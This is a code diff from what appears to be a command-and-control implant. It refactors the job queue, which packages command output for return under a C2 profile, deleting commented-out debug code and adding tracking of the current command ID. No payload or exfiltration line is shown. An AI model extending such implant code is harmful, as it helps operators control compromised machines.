@@ -31,7 +31,6 @@ auto DECLFN Jobs::Create(
     
     Self->Psr->New( JobPsr, Data, Length );
 
-
     ULONG cmdID = Self->Psr->Int16( JobPsr );
 
     NewJob->ExitCode = -1;
@@ -85,14 +84,6 @@ auto DECLFN Jobs::Send(
             KhDbg( "concatenating job: %s", Current->UUID );
             KhDbg( "data at %p [%d bytes]", Current->Pkg->Buffer, Current->Pkg->Length );
 
-            // Print the Actual Bytes of Current->Pkg->Buffer for Debugging
-            // KhDbg( "Job Package Bytes for Job UUID:%s, CmdID: %d", Current->UUID, Current->CmdID );
-            // for ( UINT64 i = 0; i < Current->Pkg->Length; i++ ) {
-            //     KhDbg( "%02X ", (BYTE)((BYTE*)Current->Pkg->Buffer)[i] );
-            // }
-            // KhDbg( "Done Printing\n" );
-
-
             Self->Pkg->Int32( PostJobs, PROFILE_C2 );
             Self->Pkg->Int32( PostJobs, Current->Pkg->Length );
             Self->Pkg->Pad( PostJobs, UC_PTR( Current->Pkg->Buffer ), Current->Pkg->Length );
@@ -103,15 +94,6 @@ auto DECLFN Jobs::Send(
                 Self->Pkg->Destroy( Current->Pkg );
                 Current->Pkg = Self->Pkg->Create( Current->CmdID, Current->UUID );
             }
-
-            // if( Current->Clean ){
-            //     Current->State = KH_JOB_TERMINATE;
-            // }else{
-            //     Current->State = KH_JOB_RUNNING;
-            //     Self->Pkg->Destroy( Current->Pkg );
-            //     Current->Pkg = Self->Pkg->Create( Current->CmdID, Current->UUID );
-            // }
-            // Current->State = KH_JOB_TERMINATE;
         } else if ( 
             Current->State    == KH_JOB_READY_SEND && 
             Current->ExitCode != EXIT_SUCCESS      &&
@@ -212,9 +194,10 @@ auto DECLFN Jobs::ExecuteAll( VOID ) -> LONG {
 
             FlagRet = 1;
 
-            this->CurrentUUID = Current->UUID;
-            Current->State    = KH_JOB_RUNNING;
-            ERROR_CODE Result = Self->Jbs->Execute( Current );
+            this->CurrentUUID  = Current->UUID;
+            this->CurrentCmdId = Current->CmdID;
+            Current->State     = KH_JOB_RUNNING;
+            ERROR_CODE Result  = Self->Jbs->Execute( Current );
             Current->ExitCode  = Result;
             Current->State     = KH_JOB_READY_SEND;
 
